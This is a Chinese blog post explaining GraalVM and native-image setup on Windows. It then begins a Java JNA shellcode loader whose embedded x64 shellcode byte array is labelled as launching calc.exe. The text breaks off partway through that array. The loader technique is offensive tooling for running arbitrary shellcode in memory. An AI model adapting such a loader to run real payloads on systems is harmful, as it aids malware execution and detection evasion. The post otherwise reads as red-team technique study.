---
title: 使用Graalvm加载Shellcode - admin-神风
url: https://www.cnblogs.com/wh4am1/p/17060912.html
source: 博客园 - admin-神风
date: 2023-01-19
fetch_date: 2025-10-04T04:17:05.681235
---

# 使用Graalvm加载Shellcode - admin-神风

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/wh4am1/)

# [admin-神风](https://www.cnblogs.com/wh4am1)

##

* [博客园](https://www.cnblogs.com/)
* [首页](https://www.cnblogs.com/wh4am1/)
* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* [联系](https://msg.cnblogs.com/send/admin-%E7%A5%9E%E9%A3%8E)
* 订阅
* [管理](https://i.cnblogs.com/)

# [使用Graalvm加载Shellcode](https://www.cnblogs.com/wh4am1/p/17060912.html "发布于 2023-01-18 23:54")

### Graalvm介绍

介绍Graalvm之前，首先就要了解Java编译的JIT和AOT是什么

JIT(Just-in-Time,即时编译)和AOT(Ahead-of-Time,预编译)，就像Java常见的是需要什么类，就加载进来编译并解析。而现随着云计算的发展，很多微服务架构都需要提前通过编译转换成原生可执行的，原先的JIT方式在云环境中就存在很多的限制。

AOT带来的好处，可以使Java在虚拟机加载这些二进制文件能直接调用，无需再等编译器运行时再转换成机器码，可以减少性能和内存的消耗。但缺点也很明显，提前编译就意味着对机器的指令要求很高，因此不可以跨平台执行，打破了一次编译到处运行的设计理念，同时也不存在反射等动态调用的能力。

而Graalvm应运而生

![](https://img2023.cnblogs.com/blog/1124287/202301/1124287-20230118235018185-2023168074.png)

Oracle在2019年推出的新一代UVM（通用虚拟机），它在HotSpotVM的基础上进行了大量的优化和改进，主要提供了两大特性：

* Polyglot：多语言支持，你可以在GraalVM中无缝运行多种语言，包括Java、JS、Ruby、Python甚至是Rust。更重要的是可以通过GraalVM的API来实现语言混编 —— 比如在一段Java代码中无缝引用并调用一个Python实现的模块。
* HighPerformance：高性能，首先它提供了一个高性能的JIT引擎，让Java语言在GraalVM上执行的时候效率更高速度更快 ；其次就是提供了SubstrateVM，通过Graal Compiler你可以将各种支持的语言（包括Java）编译成本地机器代码，获得更好的性能表现。

### 安装Graalvm

在<https://github.com/graalvm/graalvm-ce-builds/releases>地址下载对应版本的安装文件后，解压

需要配置两个系统环境

* PATH：安装目录下的/bin文件
* JAVA\_HOME：安装目录

设置好之后，运行java -version查看Graalvm是否安装成功

![](https://img2023.cnblogs.com/blog/1124287/202301/1124287-20230118235100797-1052032159.png)

再使用Graalvm Update工具下载Native-Image

![](https://img2023.cnblogs.com/blog/1124287/202301/1124287-20230118235122680-295432033.png)

而想在Windows上执行Native-Image，首先得安装Visual Studio的环境，用x64 Native Tools Command Prompt命令行来执行

这里我使用Visual Studio 2017的桌面开发环境，安装了MSVC和默认的默认的库类

找到安装目录的\VC\Auxiliary\Build\vcvars64.bat

设置环境变量：

Lib

```
C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\VC\Tools\MSVC\14.29.30133\lib\x64
C:\Program Files (x86)\Windows Kits\10\Lib\10.0.19041.0\ucrt\x64
C:\Program Files (x86)\Windows Kits\10\Lib\10.0.19041.0\um\x64
```

MSVC

```
C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\VC\Tools\MSVC\14.29.30133
```

Include

```
C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\VC\Tools\MSVC\14.29.30133\include
C:\Program Files (x86)\Windows Kits\10\Include\10.0.19041.0\ucrt
C:\Program Files (x86)\Windows Kits\10\Include\10.0.19041.0\um
C:\Program Files (x86)\Windows Kits\10\Include\10.0.19041.0\shared
```

设置完成后添加如下路径到PATH中

```
%MSVC%\bin\Hostx64\x64
```

但是我这里出现了bug，不知道为啥命令提示符执行没有结果，最后是使用VS Code里的Terminal才成功的。

![](https://img2023.cnblogs.com/blog/1124287/202301/1124287-20230118235238251-909976076.png)

可以看到Native-Image编译后的程序运行速度快了近39倍！

### Java ShellCode Loader

原本是想用rebeyond师傅提出的Shellcode执行方法来弄，后面发现打包成jar包一直报ClassNotFound，把依赖打包进去也不管用，于是就在Github上找到一个ShellCode注入的方法：<https://github.com/yzddmr6/Java-Shellcode-Loader>

核心原理是用JNA的方法

```
package executeCode;

import com.sun.jna.Memory;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.WinBase;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinNT;
import com.sun.jna.platform.win32.WinNT.HANDLE;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.win32.StdCallLibrary;
import com.sun.jna.win32.W32APIOptions;

import java.util.Random;

public class Jna {
    static byte shellcode[] = new byte[]   //pop calc.exe x64
            {
                    (byte) 0xfc, (byte) 0x48, (byte) 0x83, (byte) 0xe4, (byte) 0xf0, (byte) 0xe8, (byte) 0xc0, (byte) 0x00,
                    (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0x51, (byte) 0x41, (byte) 0x50, (byte) 0x52, (byte) 0x51,
                    (byte) 0x56, (byte) 0x48, (byte) 0x31, (byte) 0xd2, (byte) 0x65, (byte) 0x48, (byte) 0x8b, (byte) 0x52,
                    (byte) 0x60, (byte) 0x48, (byte) 0x8b, (byte) 0x52, (byte) 0x18, (byte) 0x48, (byte) 0x8b, (byte) 0x52,
                    (byte) 0x20, (byte) 0x48, (byte) 0x8b, (byte) 0x72, (byte) 0x50, (byte) 0x48, (byte) 0x0f, (byte) 0xb7,
                    (byte) 0x4a, (byte) 0x4a, (byte) 0x4d, (byte) 0x31, (byte) 0xc9, (byte) 0x48, (byte) 0x31, (byte) 0xc0,
                    (byte) 0xac, (byte) 0x3c, (byte) 0x61, (byte) 0x7c, (byte) 0x02, (byte) 0x2c, (byte) 0x20, (byte) 0x41,
                    (byte) 0xc1, (byte) 0xc9, (byte) 0x0d, (byte) 0x41, (byte) 0x01, (byte) 0xc1, (byte) 0xe2, (byte) 0xed,
                    (byte) 0x52, (byte) 0x41, (byte) 0x51, (byte) 0x48, (byte) 0x8b, (byte) 0x52, (byte) 0x20, (byte) 0x8b,
                    (byte) 0x42, (byte) 0x3c, (byte) 0x48, (byte) 0x01, (byte) 0xd0, (byte) 0x8b, (byte) 0x80, (byte) 0x88,
                    (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x85, (byte) 0xc0, (byte) 0x74, (byte) 0x67,
                    (byte) 0x48, (byte) 0x01, (byte) 0xd0, (byte) 0x50, (byte) 0x8b, (byte) 0x48, (byte) 0x18, (byte) 0x44,
                    (byte) 0x8b, (byte) 0x40, (byte) 0x20, (byte) 0x49, (byte) 0x01, (byte) 0xd0, (byte) 0xe3, (byte) 0x56,
                    (byte) 0x48, (byte) 0xff, (byte) 0xc9, (byte) 0x41, (byte) 0x8b, (byte) 0x34, (byte) 0x88, (byte) 0x48,
                    (byte) 0x01, (byte) 0xd6, (byte) 0x4d, (byte) 0x31, (byte) 0xc9, (byte) 0x48, (byte) 0x31, (byte) 0xc0,
                    (byte) 0xac, (byte) 0x41, (byte) 0xc1, (byte) 0xc9, (byte) 0x0d, (byte) 0x41, (byte) 0x01, (byte) 0xc1,
                    (byte) 0x38, (byte) 0xe0, (byte) 0x75, (byte) 0xf1, (byte) 0x4c, (byte) 0x03, (byte) 0x4c, (byte) 0x24,
                    (byte) 0x08, (byte) 0x45, (byte) 0x39, (byte) 0xd1, (byte) 0x75, (byte) 0xd8, (byte) 0x58, (byte) 0x44,
                    (byte) 0x8b, (byte) 0x40, (byte) 0x24, (byte) 0x49, (byte) 0x01, (byte) 0xd0, (byte) 0x66, (byte) 0x41,
                    (byte) 0x8b, (byte) 0x0c, (byte) 0x48, (byte) 0x44, (byte) 0x8b, (byte) 0x40, (byte) 0x1c, (byte) 0x49,
                    (byte) 0x01, (byte) 0xd0, (byte) 0x41, (byte) 0x8b, (byte) 0x04, (byte) 0x88, (byte) 0x48, (byte) 0x01,
                    (byte) 0xd0, (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x58, (byte) 0x5e, (byte) 0x59, (byte) 0x5a,
                    (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x59, (byte) 0x41, (byte) 0x5a, (byte) 0x48, (byte) 0x83,
                    (byte) 0xec, (byte) 0x20, (byte) 0x41, (byte) 0x52, (byte) 0xff, (byte) 0xe0, (byte) 0x58, (byte) 0x41,
                    (byte) 0x59, (byte) 0x5a, (byte) 0x48, (byte) 0x8b, (byte) 0x12, (byte) 0xe9, (byte) 0x57, (byte) 0xff,
                    (byte) 0xff, (byte) 0xff, (byte) 0x5d, (byte) 0x48, (byte) 0xba, (byte) 0x01, (byte) 0x00, (byte) 0x00,
   ...